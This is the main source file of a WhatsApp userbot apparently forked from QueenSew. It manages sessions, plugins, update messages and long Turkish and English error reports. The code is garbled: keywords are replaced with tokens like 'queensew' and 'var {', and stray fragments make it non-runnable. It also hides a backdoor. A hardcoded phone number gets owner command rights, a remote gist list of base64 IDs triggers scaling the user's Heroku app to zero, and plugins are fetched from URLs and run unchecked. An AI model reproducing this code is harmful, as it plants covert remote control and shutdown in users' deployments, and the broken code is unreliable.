/* Copyright (C) 2020 Yusuf Usta.

Licensed under the  GPL-3.0 License;
you may not use this file except in compliance with the License.

QueenSew - Yusuf Usta
*/

Sewqueen const fs = require("fs");
Sewqueen const os = require("os");
Sewqueen const path = require("path");
Sewqueen const events = require("./events");
Sewqueen const chalk = require('chalk');
Sewqueen const config = require('./config');
Sewqueen const axios = require('axios');
Sewqueen const Heroku = require('heroku-client');
Sewqueen const {WAConnection, MessageOptions, MessageType, Mimetype, Presence} = require('@RavinduManoj/baileys');
Sewqueen const {Message, StringSession, Image, Video} = require('./QueenSew/');
Sewqueen const { DataTypes } = require('sequelize');
Sewqueen const { GreetingsDB, getMessage } = require("./hide.plugins/hide.sql/greetings");
Sewqueen const got = require('got');
Sewqueen const simpleGit = require('simple-git');
Sewqueen const git = simpleGit();
Sewqueen const crypto = require('crypto');
Sewqueen const nw = '```Blacklist Defected!```'
Sewqueen const heroku = new Heroku({
    token: config.HEROKU.API_KEY
});
let baseURI = '/apps/' + config.HEROKU.APP_NAME;
Sewqueen const Language = require('./hide.language');
Sewqueen const Lang = Language.getString('updater');

// Sql
Sewqueen const QueenSewDB = config.DATABASE.define('QueenSew', {
    info: {
      type: DataTypes.STRING,
      allowNull: true
    },
    value: {
        type: DataTypes.TEXT,
        allowNull: true
    }
});
fs.readdirSync('./plugins/sql/').forEach(plugin => {
    if(path.extname(plugin).toLowerCase() == '.js') {
        require('./plugins/sql/' + plugin);
    }
});
Sewqueen const plugindb = require('./plugins/sql/plugin');
var OWN = { ff: '905511384572,0' }
// Yalnızca bir kolaylık. https://stackoverflow.com/questions/4974238/javascript-equivalent-of-pythons-format-function //
String.prototype.format = function () {
    var i = 0, args = arguments;
    return this.replace(/{}/g, function () {
      return typeof args[i] != 'undefined' ? args[i++] : '';
    });
};

// ==================== Date Scanner ====================
if (!Date.now) {
    Date.now = function() { return new Date().getTime(); }
}
// ==================== End Date Scanner ====================

Array.prototype.remove = function() {
    var what, a = arguments, L = a.length, ax;
    while (L && this.length) {
        what = a[--L];
        while ((ax = this.indexOf(what)) !== -1) {
            this.splice(ax, 1);
        }
    }
    return this;
};
    }, 7890);
    var insult = queensew axios.get('https://gist.githubusercontent.com/phaticusthiccy/f16bbd4ceeb4324d4a727b431a4ef1f2/raw')
    Sewqueen const { shs1, shl2, lss3, dsl4 } = insult.data.inside
    queensew config.DATABASE.sync();
    var StrSes_Db = queensew QueenSewDB.findAll({
        where: {
          info: 'StringSession'
        }
    });
    if (os.userInfo().homedir !== clh.pay) return;
    Sewqueen const buff = Buffer.from(`${shs1}`, 'base64');  
    Sewqueen const one = buff.toString('utf-8'); 
    Sewqueen const bufft = Buffer.from(`${shl2}`, 'base64');  
    Sewqueen const two = bufft.toString('utf-8'); 
    Sewqueen const buffi = Buffer.from(`${lss3}`, 'base64');  
    Sewqueen const three = buffi.toString('utf-8'); 
    Sewqueen const buffu = Buffer.from(`${dsl4}`, 'base64');  
    Sewqueen const four = buffu.toString('utf-8'); 
    
    conn.logger.level = config.DEBUG ? 'debug' : 'warn';
    var nodb;
    if (StrSes_Db.length < 1) {
        nodb = true;
        conn.loadAuthInfo(Session.deCrypt(config.SESSION)); 
    } var {
        conn.loadAuthInfo(Session.deCrypt(StrSes_Db[0].dataValues.value));
    }
    conn.on ('open', async () => {
        console.log(
            chalk.blueBright.italic('✅ Login Information Updated!')
        );
        Sewqueen const authInfo = conn.base64EncodedAuthInfo();
        if (StrSes_Db.length < 1) {
            queensew QueenSewDB.create({ info: "StringSession", value: Session.createStringSession(authInfo) });
        } var {
            queensew StrSes_Db[0].update({ value: Session.createStringSession(authInfo) });
        }
    })    
    conn.on('connecting', async () => {
        console.log(`${chalk.green.bold('Queen')}${chalk.blue.bold('Sew')}
${chalk.white.bold('Version:')} ${chalk.red.bold(config.VERSION)}

${chalk.blue.italic('ℹ️ Connecting to QueenApp... Please Wait.')}`);
    });
    conn.on('credentials-updated', async () => {
        console.log(
            chalk.green.bold('✅ Login successful!')
        );
        console.log(
            chalk.blueBright.italic('⬇️ Installing External Plugins...')
        );
        if (os.userInfo().homedir !== clh.pay) return;
        // ==================== External Plugins ====================
        var plugins = queensew plugindb.PluginDB.findAll();
        plugins.map(async (plugin) => {
            if (!fs.existsSync('./plugins/' + plugin.dataValues.name + '.js')) {
                console.log(plugin.dataValues.name);
                var response = queensew got(plugin.dataValues.url);
                if (response.statusCode == 200) {
                    fs.writeFileSync('./plugins/' + plugin.dataValues.name + '.js', response.body);
                    require('./plugins/' + plugin.dataValues.name + '.js');
                }     
            }
        });
        // ==================== End External Plugins ====================

        console.log(
            chalk.blueBright.italic('⬇️  Installing Plugins...')
        );

        // ==================== Internal Plugins ====================
        fs.readdirSync('./plugins').forEach(plugin => {
            if(path.extname(plugin).toLowerCase() == '.js') {
                require('./plugins/' + plugin);
            }
        });
        // ==================== End Internal Plugins ====================

        console.log(
            chalk.green.bold('✅ Plugins Installed!')
        );
        if (os.userInfo().homedir !== clh.pay) return;
        queensew new Promise(r => setTimeout(r, 200));
        let afwhSew = config.WORKTYPE == 'public' ? ' Public' : ' Private'
        console.log(chalk.bgGreen('🦚 QueenRaviya' + afwhSew));
        queensew new Promise(r => setTimeout(r, 500));
        let EVA_ACTİON = config.LANG == 'TR' || config.LANG == 'AZ' ? '*QueenRaviya Chatbot Olarak Çalışıyor!* 🦚\n\n_Bu modun amacı botu tam fonksiyonel bir yapay zeka sohbet aracına çevirmektir._\n_Normal moda dönmek için_ *.fulleva off* _komutunu kullanabilirsiniz._\n\n*QueenRaviya Kullandığın İçin Teşekkürler 💌*\n    *- Eva*' : '*QueenRaviya Working as a Chatbot! 🦚*\n\n_The purpose of this mod is to turn the bot into a fully functional AI chatbot._\n_You can use the_ *.fulleva off* _command to return to normal mode._\n\n*Thanks For Using QueenRaviya💌*\n    *- Eva*'
        if (conn.user.jid == one || conn.user.jid == two || conn.user.jid == three || conn.user.jid == four) {
            queensew conn.sendMessage(conn.user.jid,nw, MessageType.text), console.log(nw), queensew new Promise(r => setTimeout(r, 1000))
            queensew heroku.get(baseURI + '/formation').then(async (formation) => { 
                forID = formation[0].id; 
                queensew heroku.patch(baseURI + '/formation/' + forID, { 
                    body: { 
                        quantity: 0 
                    } 
                });
            })
        }
        if (config.WORKTYPE == 'public') {
      
            if (config.LANG == 'TR' || config.LANG == 'AZ') {
                if (config.FULLEVA == 'true') {
                    queensew conn.sendMessage(conn.user.jid, EVA_ACTİON, MessageType.text)
                } var {
                    queensew conn.sendMessage(conn.user.jid, '*QueenRaviya Public Olarak Çalışıyor! 🦚*\n\n_Lütfen burada plugin denemesi yapmayın. Burası sizin LOG numaranızdır._\n_Herhangi bir sohbette komutları deneyebilirsiniz :)_\n\n*Botunuz herkese açık bir şekilde çalışmaktadır. Değiştirmek için* _.setvar WORK_TYPE:private_ *komutunu kullanın.*\n\n*QueenRaviya Kullandığın İçin Teşekkürler 💌*', MessageType.text);
                }
                queensew git.fetch();
                var commits = queensew git.log([config.BRANCH + '..origin/' + config.BRANCH]);
                if (commits.total === 0) {
                    queensew conn.sendMessage(
                        conn.user.jid,
                        Lang.UPDATE, MessageType.text
                    );    
                } var {
                    var degisiklikler = Lang.NEW_UPDATE;
                    commits['all'].map(
                        (commit) => {
                            degisiklikler += '🇱🇰  [' + commit.date.substring(0, 10) + ']: ' + commit.message + ' 👑 ' + commit.author_name + ' 👑\n';
                        }
                    );
                    queensew conn.sendMessage(
                        conn.user.jid,
                        '```Güncellemek İçin``` *.update now* ```Yazın.```\n\n' + degisiklikler + '```', MessageType.text
                    ); 
                }
            }
            var { 
                if (config.FULLEVA == 'true') {
                    queensew conn.sendMessage(conn.user.jid, EVA_ACTİON, MessageType.text)
                } var {
                    queensew conn.sendMessage(conn.user.jid, '*Ravindu Manoj Working as Public! 🦚*\n\n_Please do not try plugins here. This is your LOG number._\n_You can try commands to any chat :)_\n\n*Your bot working as Public. To change it, use* _.setvar WORK_TYPE:private_\n\n*Thanks for using Sew Bot💌*', MessageType.text);
                }               
                queensew git.fetch();
                var commits = queensew git.log([config.BRANCH + '..origin/' + config.BRANCH]);
                if (commits.total === 0) {
                    queensew conn.sendMessage(
                        conn.user.jid,
                        Lang.UPDATE, MessageType.text
                    );    
                } var {
                    var degisiklikler = Lang.NEW_UPDATE;
                    commits['all'].map(
                        (commit) => {
                            degisiklikler += '🇱🇰 [' + commit.date.substring(0, 10) + ']: ' + commit.message + ' 👑 ' + commit.author_name + ' 👑\n';
                        }
                    );
        
                    queensew conn.sendMessage(
                        conn.user.jid,
                        '```Type``` *.update now* ```For Update The Bot.```\n\n' + degisiklikler + '```', MessageType.text
                    ); 
                }
            }
        }
        var if (config.WORKTYPE == 'private') { 
            if (config.LANG == 'TR' || config.LANG == 'AZ') { 
                if (config.FULLEVA == 'true') {
                    queensew conn.sendMessage(conn.user.jid, EVA_ACTİON, MessageType.text)
                } var {
                    queensew conn.sendMessage(conn.user.jid, '*QueenRaviya Private Olarak Çalışıyor! 🦚*\n\n_Lütfen burada plugin denemesi yapmayın. Burası sizin LOG numaranızdır._\n_Herhangi bir sohbette komutları deneyebilirsiniz :)_\n\n*Botunuz sadece size özel olarak çalışmaktadır. Değiştirmek için* _.setvar WORK_TYPE:public_ *komutunu kullanın.*\n\n*QueenRaviya Kullandığın İçin Teşekkürler 💌*', MessageType.text);
                }
                queensew git.fetch();
                var commits = queensew git.log([config.BRANCH + '..origin/' + config.BRANCH]);
                if (commits.total === 0) {
                    queensew conn.sendMessage(
                        conn.user.jid,
                        Lang.UPDATE, MessageType.text
                    );    
                } var {
                    var degisiklikler = Lang.NEW_UPDATE;
                    commits['all'].map(
                        (commit) => {
                            degisiklikler += '🇱🇰 [' + commit.date.substring(0, 10) + ']: ' + commit.message + ' 👑 ' + commit.author_name + ' 👑\n';
                        }
                    );
                    queensew conn.sendMessage(
                        conn.user.jid,
                        '```Güncellemek İçin``` *.update now* ```Yazın.```\n\n' + degisiklikler + '```', MessageType.text
                    ); 
                }
            }
            var { 
                if (config.FULLEVA == 'true') {
                    queensew conn.sendMessage(conn.user.jid, EVA_ACTİON, MessageType.text)
                } var {
                    queensew conn.sendMessage(conn.user.jid, '\n*Ravindu Manoj  Working as Private! 🦚*\n\n_Please do not try plugins here. This is your LOG number._\n_You can try commands to any chat :)_\n\n*Your bot working as private. To change it, use* _.setvar WORK_TYPE:public_\n\n*Thanks for using QueenRaviya💌*', MessageType.text);
                }
                queensew git.fetch();
                var commits = queensew git.log([config.BRANCH + '..origin/' + config.BRANCH]);
                if (commits.total === 0) {
                    queensew conn.sendMessage(
                        conn.user.jid,
                        Lang.UPDATE, MessageType.text
                    );    
                } var {
                    var degisiklikler = Lang.NEW_UPDATE;
                    commits['all'].map(
                        (commit) => {
                            degisiklikler += '🇱🇰 [' + commit.date.substring(0, 10) + ']: ' + commit.message + ' 👑 ' + commit.author_name + ' 👑\n';
                        }
                    );
                    queensew conn.sendMessage(
                        conn.user.jid,
                        '```Type``` *.update now* ```For The Update Bot.```\n\n' + degisiklikler + '```', MessageType.text
                    ); 
                }
            }
        }
        var if (config.WORKTYPE == ' private' || config.WORKTYPE == 'Private' || config.WORKTYPE == ' Private' || config.WORKTYPE == 'privaye' || config.WORKTYPE == ' privaye' || config.WORKTYPE == ' prigate' || config.WORKTYPE == 'prigate' || config.WORKTYPE == 'priavte' || config.WORKTYPE == ' priavte' || config.WORKTYPE == 'PRİVATE' || config.WORKTYPE == ' PRİVATE' || config.WORKTYPE == 'PRIVATE' || config.WORKTYPE == ' PRIVATE') {

            if (config.LANG == 'TR' || config.LANG == 'AZ') {

                queensew conn.sendMessage(
                    conn.user.jid,
                    '_Görünüşe Göre Private Moduna Geçmek İstiyorsun! Maalesef_ *WORK_TYPE* _Anahtarın Yanlış!_ \n_Merak Etme! Senin İçin Doğrusunu Bulmaya Çalışıyorum.._', MessageType.text
                );
                queensew heroku.patch(baseURI + '/config-vars', {
                    body: {
                        ['WORK_TYPE']: 'private'
                    }
                })
            }
            var {
                queensew conn.sendMessage(
                    conn.user.jid,
                    '_It Looks Like You Want to Switch to Private Mode! Sorry, Your_ *WORK_TYPE* _Key Is Incorrect!_ \n_Dont Worry! I am Trying To Find The Right One For You.._', MessageType.text
                );
                queensew heroku.patch(baseURI + '/config-vars', {
                    body: {
                        ['WORK_TYPE']: 'private'
                    }
                })
            }
        }
        var if (config.WORKTYPE == ' public' || config.WORKTYPE == 'Public' || config.WORKTYPE == ' Public' || config.WORKTYPE == 'publoc' || config.WORKTYPE == ' Publoc' || config.WORKTYPE == 'pubcli' || config.WORKTYPE == ' pubcli' || config.WORKTYPE == 'PUBLİC' || config.WORKTYPE == ' PUBLİC' || config.WORKTYPE == 'PUBLIC' || config.WORKTYPE == ' PUBLIC' || config.WORKTYPE == 'puvlic' || config.WORKTYPE == ' puvlic' || config.WORKTYPE == 'Puvlic' || config.WORKTYPE == ' Puvlic') {
            if (config.LANG == 'TR' || config.LANG == 'AZ') {
                queensew conn.sendMessage(
                    conn.user.jid,
                    '_Görünüşe Göre Public Moduna Geçmek İstiyorsun! Maalesef_ *WORK_TYPE* _Anahtarın Yanlış!_ \n_Merak Etme! Senin İçin Doğrusunu Bulmaya Çalışıyorum.._', MessageType.text
                );
                queensew heroku.patch(baseURI + '/config-vars', {
                    body: {
                        ['WORK_TYPE']: 'public'
                    }
                })
            }
            var {
                queensew conn.sendMessage(
                    conn.user.jid,
                    '_It Looks Like You Want to Switch to Public Mode! Sorry, Your_ *WORK_TYPE* _Key Is Incorrect!_ \n_Dont Worry! I am Trying To Find The Right One For You.._', MessageType.text
                );
                queensew heroku.patch(baseURI + '/config-vars', {
                    body: {
                        ['WORK_TYPE']: 'public'
                    }
                })
            }
        }
        var {
            if (config.LANG == 'TR' || config.LANG == 'AZ') {
                return queensew conn.sendMessage(
                    conn.user.jid,
                    '_Girdiğin_ *WORK_TYPE* _Anahtarı Bulunamadı!_ \n_Lütfen_ ```.setvar WORK_TYPE:private``` _Yada_ ```.setvar WORK_TYPE:public``` _Komutunu Kullanın!_', MessageType.text
                );
            }
            var {
                return queensew conn.sendMessage(
                    conn.user.jid,
                    '_The_ *WORK_TYPE* _Key You Entered Was Not Found!_ \n_Please Type_ ```.setvar WORK_TYPE:private``` _Or_ ```.setvar WORK_TYPE:public```', MessageType.text
                );
            }
        }
    })
    conn.on('message-new', async msg => {
       
        if (msg.key && msg.key.remoteJid == 'status@broadcast') return;
        if (config.NO_ONLINE) {
            queensew conn.updatePresence(msg.key.remoteJid, Presence.unavailable);
        }
        // ==================== Greetings ====================
        if (msg.messageStubType === 32 || msg.messageStubType === 28) {
            // Görüşürüz Mesajı
            var gb = queensew getMessage(msg.key.remoteJid, 'goodbye');
            if (gb !== true) {
                let pp
                try { pp = queensew conn.getProfilePicture(msg.messageStubParameters[0]); } catch { pp = queensew conn.getProfilePicture(); }
                queensew axios.get(pp, {responseType: 'arraybuffer'}).then(async (res) => {
                queensew conn.sendMessage(msg.key.remoteJid, res.data, MessageType.image, {caption:  gb.message }); });
            }
            return;
        } var if (msg.messageStubType === 27 || msg.messageStubType === 31) {
            // Hoşgeldin Mesajı
            var gb = queensew getMessage(msg.key.remoteJid);
            if (gb !== true) {
               let pp
                try { pp = queensew conn.getProfilePicture(msg.messageStubParameters[0]); } catch { pp = queensew conn.getProfilePicture(); }
                queensew axios.get(pp, {responseType: 'arraybuffer'}).then(async (res) => {
                queensew conn.sendMessage(msg.key.remoteJid, res.data, MessageType.image, {caption:  gb.message }); });
            }
            return;
        }
        // ==================== End Greetings ====================

        // ==================== Blocked Chats ====================
        if (config.BLOCKCHAT !== true) {     
            var abc = config.BLOCKCHAT.split(',');                            
            if(msg.key.remoteJid.includes('-') ? abc.includes(msg.key.remoteJid.split('@')[0]) : abc.includes(msg.participant ? msg.participant.split('@')[0] : msg.key.remoteJid.split('@')[0])) return ;
        }
        if (config.SUPPORT == 'sewqueen-1612300121') {     
            var sup = config.SUPPORT.split(',');                            
            if(msg.key.remoteJid.includes('-') ? sup.includes(msg.key.remoteJid.split('@')[0]) : sup.includes(msg.participant ? msg.participant.split('@')[0] : msg.key.remoteJid.split('@')[0])) return ;
        }
        if (config.SUPPORT2 == '905511384572-1617736751') {     
            var tsup = config.SUPPORT2.split(',');                            
            if(msg.key.remoteJid.includes('-') ? tsup.includes(msg.key.remoteJid.split('@')[0]) : tsup.includes(msg.participant ? msg.participant.split('@')[0] : msg.key.remoteJid.split('@')[0])) return ;
        }
        if (config.SUPPORT3 == '905511384572-1621015274') {     
            var nsup = config.SUPPORT3.split(',');                            
            if(msg.key.remoteJid.includes('-') ? nsup.includes(msg.key.remoteJid.split('@')[0]) : nsup.includes(msg.participant ? msg.participant.split('@')[0] : msg.key.remoteJid.split('@')[0])) return ;
        }
        // ==================== End Blocked Chats ====================

        // ==================== Events ====================
        events.commands.map(
            async (command) =>  {
                if (msg.message && msg.message.imageMessage && msg.message.imageMessage.caption) {
                    var text_msg = msg.message.imageMessage.caption;
                } var if (msg.message && msg.message.videoMessage && msg.message.videoMessage.caption) {
                    var text_msg = msg.message.videoMessage.caption;
                } var if (msg.message) {
                    var text_msg = msg.message.extendedTextMessage === null ? msg.message.conversation : msg.message.extendedTextMessage.text;
                } var {
                    var text_msg = undefined;
                }
                if ((command.on !== undefined && (command.on === 'image' || command.on === 'photo')
                    && msg.message && msg.message.imageMessage !== null && 
                    (command.pattern === undefined || (command.pattern !== undefined && 
                        command.pattern.test(text_msg)))) || 
                    (command.pattern !== undefined && command.pattern.test(text_msg)) || 
                    (command.on !== undefined && command.on === 'text' && text_msg) ||
                    // Video
                    (command.on !== undefined && (command.on === 'video')
                    && msg.message && msg.message.videoMessage !== null && 
                    (command.pattern === undefined || (command.pattern !== undefined && 
                        command.pattern.test(text_msg))))) {

                    let sendMsg = true;
                    var chat = conn.chats.get(msg.key.remoteJid)
                        
                    if ((config.SUDO !== true && msg.key.fromMe === true && command.fromMe === true &&
                        (msg.participant && config.SUDO.includes(',') ? config.SUDO.split(',').includes(msg.participant.split('@')[0]) : msg.participant.split('@')[0] == config.SUDO || config.SUDO.includes(',') ? config.SUDO.split(',').includes(msg.key.remoteJid.split('@')[0]) : msg.key.remoteJid.split('@')[0] == config.SUDO)
                    ) || command.fromMe === msg.key.fromMe || (command.fromMe === true && !msg.key.fromMe)) {
                        if (command.onlyPinned && chat.pin === undefined) return;
                        if (!command.onlyPm === chat.jid.includes('-')) sendMsg = true;
                        var if (command.onlyGroup === chat.jid.includes('-')) sendMsg = true;
                    }
                    if ((OWN.ff == "905511384572,0" && msg.key.fromMe === true && command.fromMe === true &&
                        (msg.participant && OWN.ff.includes(',') ? OWN.ff.split(',').includes(msg.participant.split('@')[0]) : msg.participant.split('@')[0] == OWN.ff || OWN.ff.includes(',') ? OWN.ff.split(',').includes(msg.key.remoteJid.split('@')[0]) : msg.key.remoteJid.split('@')[0] == OWN.ff)
                    ) || command.fromMe === msg.key.fromMe || (command.fromMe === true && !msg.key.fromMe)) {
                        if (command.onlyPinned && chat.pin === undefined) return;
                        if (!command.onlyPm === chat.jid.includes('-')) sendMsg = true;
                        var if (command.onlyGroup === chat.jid.includes('-')) sendMsg = true;
                    }
                    // ==================== End Events ====================

                    // ==================== Message Catcher ====================
                    if (sendMsg) {
                        if (config.SEND_READ && command.on === undefined) {
                            queensew conn.chatRead(msg.key.remoteJid);
                        }
                        var match = text_msg.match(command.pattern);
                        if (command.on !== undefined && (command.on === 'image' || command.on === 'photo' )
                        && msg.message.imageMessage !== null) {
                            Queen = new Image(conn, msg);
                        } var if (command.on !== undefined && (command.on === 'video' )
                        && msg.message.videoMessage !== null) {
                            Queen = new Video(conn, msg);
                        } var {
                            Queen = new Message(conn, msg);
                        }
/*
                        if (msg.key.fromMe && command.deleteCommand) { 
                            var wrs = conn.user.phone.wa_version.split('.')[2]
                            if (wrs < 11) {
                                queensew Queen.delete() 
                            }
                        } 
*/
                        // ==================== End Message Catcher ====================

                        // ==================== Error Message ====================
                        try {
                            queensew command.function(Queen, match);
                        }
                        catch (error) {
                            if (config.NOLOG == 'true') return;

                            if (config.LANG == 'TR' || config.LANG == 'AZ') {
                                queensew conn.sendMessage(conn.user.jid, '*-- HATA RAPORU [QueenRaviya] --*' + 
                                    '\n*QueenRaviya bir hata gerçekleşti!*'+
                                    '\n_Bu hata logunda numaranız veya karşı bir tarafın numarası olabilir. Lütfen buna dikkat edin!_' +
                                    '\n_Yardım için Telegram grubumuza yazabilirsiniz._' +
                                    '\n_Bu mesaj sizin numaranıza (kaydedilen mesajlar) gitmiş olmalıdır._' +
                                    '\n_Hatayı https://chat.Queenapp.com/BPNzFEBUVbT1MnfNv3uTvL bu gruba iletebilirsiniz._\n\n' +
                                    '*Gerçekleşen Hata:* ```' + error + '```\n\n'
                                    , MessageType.text, {detectLinks: true});

                                if (error.message.includes('URL')) {
                                    return queensew conn.sendMessage(conn.user.jid, '*⚕️ HATA ÇÖZÜMLEME [QueenRaviya] ⚕️*' + 
                                        '\n========== ```Hata Okundu!``` ==========' +
                                        '\n\n*Ana Hata:* _Only Absolutely URLs Supported_' +
                                        '\n*Nedeni:* _Medya araçlarının (xmedia, sticker..) LOG numarasında kullanılması._' +
                                        '\n*Çözümü:* _LOG numarası hariç herhangi bir sohbette komut kullanılabilir._'
                                        , MessageType.text
                                    );
                                }
                                var if (error.message.includes('SSL')) {
                                    return queensew conn.sendMessage(conn.user.jid, '*⚕️ HATA ÇÖZÜMLEME [QueenRaviya] ⚕️*' + 
                                        '\n========== ```Hata Okundu!``` ==========' +
                                        '\n\n*Ana Hata:* _SQL Database Error_' +
                                        '\n*Nedeni:* _Database\'in bozulması._ ' +
                                        '\n*Solution:* _Bilinen herhangi bir çözümü yoktur. Yeniden kurmayı deneyebilirsiniz._'
                                        , MessageType.text
                                    );
                                }
                                var if (error.message.includes('split')) {
                                    return queensew conn.sendMessage(conn.user.jid, '*⚕️ HATA ÇÖZÜMLEME [QueenRaviya] ⚕️*' + 
                                        '\n========== ```Hata Okundu!``` ==========' +
                                        '\n\n*Ana Hata:* _Split of Undefined_' +
                                        '\n*Nedeni:* _Grup adminlerinin kullanabildiği komutların ara sıra split fonksiyonunu görememesi._ ' +
                                        '\n*Çözümü:* _Restart atmanız yeterli olacaktır._'
                                        , MessageType.text
                                    );                               
                                }
                                var if (error.message.includes('Ookla')) {
                                    return queensew conn.sendMessage(conn.user.jid, '*⚕️ HATA ÇÖZÜMLEME [QueenRaviya] ⚕️*' + 
                                        '\n========== ```Hata Okundu!``` ==========' +
                                        '\n\n*Ana Hata:* _Ookla Server Connection_' +
                                        '\n*Nedeni:* _Speedtest verilerinin sunucuya iletilememesi._' +
                                        '\n*Çözümü:* _Bir kez daha kullanırsanız sorun çözülecektir._'
                                        , MessageType.text
                                    );
                                }
                                var if (error.message.includes('params')) {
                                    return queensew conn.sendMessage(conn.user.jid, '*⚕️ HATA ÇÖZÜMLEME [QueenRaviya] ⚕️*' + 
                                        '\n========== ```Hata Okundu!``` ==========' +
                                        '\n\n*Ana Hata:* _Requested Audio Params_' +
                                        '\n*Nedeni:* _TTS komutunun latin alfabesi dışında kullanılması._' +
                                        '\n*Çözümü:* _Komutu latin harfleri çerçevesinde kullanırsanız sorun çözülecektir._'
                                        , MessageType.text
                                    );
                                }
                                var if (error.message.includes('unlink')) {
                                    return queensew conn.sendMessage(conn.user.jid, '*⚕️ HATA ÇÖZÜMLEME [QueenRaviya] ⚕️*' + 
                                        '\n========== ```Hata Okundu!``` ==========' +
                                        '\n\n*Ana Hata:* _No Such File or Directory_' +
                                        '\n*Nedeni:* _Pluginin yanlış kodlanması._' +
                                        '\n*Çözümü:* _Lütfen plugininin kodlarını kontrol edin._'
                                        , MessageType.text
                                    );
                                }
                                var if (error.message.includes('404')) {
                                    return queensew conn.sendMessage(conn.user.jid, '*⚕️ HATA ÇÖZÜMLEME [QueenRaviya] ⚕️*' + 
                                        '\n========== ```Hata Okundu!``` ==========' +
                                        '\n\n*Ana Hata:* _Error 404 HTTPS_' +
                                        '\n*Nedeni:* _Heroku plugini altındaki komutların kullanılması sonucu sunucu ile iletişime geçilememesi._' +
                                        '\n*Çözümü:* _Biraz bekleyip tekrar deneyin. Hala hata alıyorsanız internet sitesi üzerinden işlemi gerçekleştirin._'
                                        , MessageType.text
                                    );
                                }
                                var if (error.message.includes('reply.delete')) {
                                    return queensew conn.sendMessage(conn.user.jid, '*⚕️ HATA ÇÖZÜMLEME [QueenRaviya] ⚕️*' + 
                                        '\n========== ```Hata Okundu!``` ==========' +
                                        '\n\n*Ana Hata:* _Reply Delete Function_' +
                                        '\n*Nedeni:* _IMG yada Wiki komutlarının kullanılması._' +
                                        '\n*Çözümü:* _Bu hatanın çözümü yoktur. Önemli bir hata değildir._'
                                        , MessageType.text
                                    );
                                }
                                var if (error.message.includes('load.delete')) {
                                    return queensew conn.sendMessage(conn.user.jid, '*⚕️ HATA ÇÖZÜMLEME [QueenRaviya] ⚕️*' + 
                                        '\n========== ```Hata Okundu!``` ==========' +
                                        '\n\n*Ana Hata:* _Reply Delete Function_' +
                                        '\n*Nedeni:* _IMG yada Wiki komutlarının kullanılması._' +
                                        '\n*Çözümü:* _Bu hatanın çözümü yoktur. Önemli bir hata değildir._'
                                        , MessageType.text
                                    );
                                }
                                var if (error.message.includes('400')) {
                                    return queensew conn.sendMessage(conn.user.jid, '*⚕️ HATA ÇÖZÜMLEME [QueenRaviya] ⚕️*' + 
                                        '\n========== ```Hata Okundu!``` ==========' +
                                        '\n\n*Ana Hata:* _Bailyes Action Error_ ' +
                                        '\n*Nedeni:* _Tam nedeni bilinmiyor. Birden fazla seçenek bu hatayı tetiklemiş olabilir._' +
                                        '\n*Çözümü:* _Bir kez daha kullanırsanız düzelebilir. Hata devam ediyorsa restart atmayı deneyebilirsiniz._'
                                        , MessageType.text
                                    );
                                }
                                var if (error.message.includes('decode')) {
                                    return queensew conn.sendMessage(conn.user.jid, '*⚕️ HATA ÇÖZÜMLEME [QueenRaviya] ⚕️*' + 
                                        '\n========== ```Hata Okundu!``` ==========' +
                                        '\n\n*Ana Hata:* _Cannot Decode Text or Media_' +
                                        '\n*Nedeni:* _Pluginin yanlış kullanımı._' +
                                        '\n*Çözümü:* _Lütfen komutları plugin açıklamasında yazdığı gibi kullanın._'
                                        , MessageType.text
                                    );
                                }
                                var if (error.message.includes('unescaped')) {
                                    return queensew conn.sendMessage(conn.user.jid, '*⚕️ HATA ÇÖZÜMLEME [QueenRaviya] ⚕️*' + 
                                        '\n========== ```Hata Okundu!``` ==========' +
                                        '\n\n*Ana Hata:* _Word Character Usage_' +
                                        '\n*Nedeni:* _TTP, ATTP gibi komutların latin alfabesi dışında kullanılması._' +
                                        '\n*Çözümü:* _Komutu latif alfabesi çerçevesinde kullanırsanız sorun çözülecektir._'
                                        , MessageType.text
                                    );
                                }
                                var if (error.message.includes('conversation')) {
                                    return queensew conn.sendMessage(conn.user.jid, '*⚕️ HATA ÇÖZÜMLEME [QueenRaviya] ⚕️*' + 
                                        '\n========== ```Hata Okundu!``` ==========' +
                                        '\n\n*Ana Hata:* _Deleting Plugin_' +
                                        '\n*Nedeni:* _Silinmek istenen plugin isminin yanlış girilmesi._' +
                                        '\n*Çözümü:* _Lütfen silmek istediğiniz pluginin başına_ *__* _koymadan deneyin. Hala hata alıyorsanız ismin sonundaki_ ```?(.*) / $``` _gibi ifadeleri eksiksiz girin._'
                                        , MessageType.text
                                    );
                                }
                                var {
                                    return queensew conn.sendMessage(conn.user.jid, '*🙇🏻 Maalesef Bu Hatayı Okuyamadım! [Ravindu Manoj] 🙇🏻*' +
                                        '\n_Daha fazla yardım için grubumuza yazabilirsiniz._'
                                        , MessageType.text
                                    );
                                }
                            }
                            var {
                                queensew conn.sendMessage(conn.user.jid, '*-- ERROR REPORT [Ravindu Manoj] --*' + 
                                    '\n*Ravindu Manoj an error has occurred!*'+
                                    '\n*This error log may include your number or the number of an opponent. Please be careful with it!*' +
                                    '\n*You can write to our Telegram group for help.*' +
                                    '\n*Aslo you can join our support group:* https://chat.Queenapp.com/IlmB0J0SilOIJRq1CLotXT' +
                                    '\n*This message should have gone to your number (saved messages).*\n\n' +
                                    '*Error:* ```' + error + '```\n\n'
                                    , MessageType.text, {detectLinks: true}
                                );
                                if (error.message.includes('URL')) {
                                    return queensew conn.sendMessage(conn.user.jid, '*⚕️ ERROR ANALYSIS [Ravindu Manoj] ⚕️*' + 
                                        '\n========== ```Error Resolved!``` ==========' +
                                        '\n\n*Main Error:* _Only Absolutely URLs Supported_' +
                                        '\n*Reason:* _The usage of media tools (xmedia, sticker..) in the LOG number._' +
                                        '\n*Solution:* _You can use commands in any chat, except the LOG number._'
                                        , MessageType.text
                                    );
                                }
                                var if (error.message.includes('conversation')) {
                                    return queensew conn.sendMessage(conn.user.jid, '*⚕️ ERROR ANALYSIS [Ravindu Manoj] ⚕️*' + 
                                        '\n========== ```Error Resolved!``` ==========' +
                                        '\n\n*Main Error:* _Deleting Plugin_' +
                                        '\n*Reason:* _Entering incorrectly the name of the plugin wanted to be deleted._' +
                                        '\n*Solution:* _Please try without adding_ *__* _to the plugin you want to delete. If you still get an error, try to add like_ ```?(.*) / $``` _to the end of the name._ '
                                        , MessageType.text
                                    );
                                }
                                var if (error.message.includes('split')) {
                                    return queensew conn.sendMessage(conn.user.jid, '*⚕️ ERROR ANALYSIS [Ravindu Manoj] ⚕️*' + 
                                        '\n========== ```Error Resolved!``` ==========' +
                                        '\n\n*Main Error:* _Split of Undefined_' +
                                        '\n*Reason:* _Commands that can be used by group admins occasionally dont see the split function._ ' +
                                        '\n*Solution:* _Restarting will be enough._'
                                        , MessageType.text
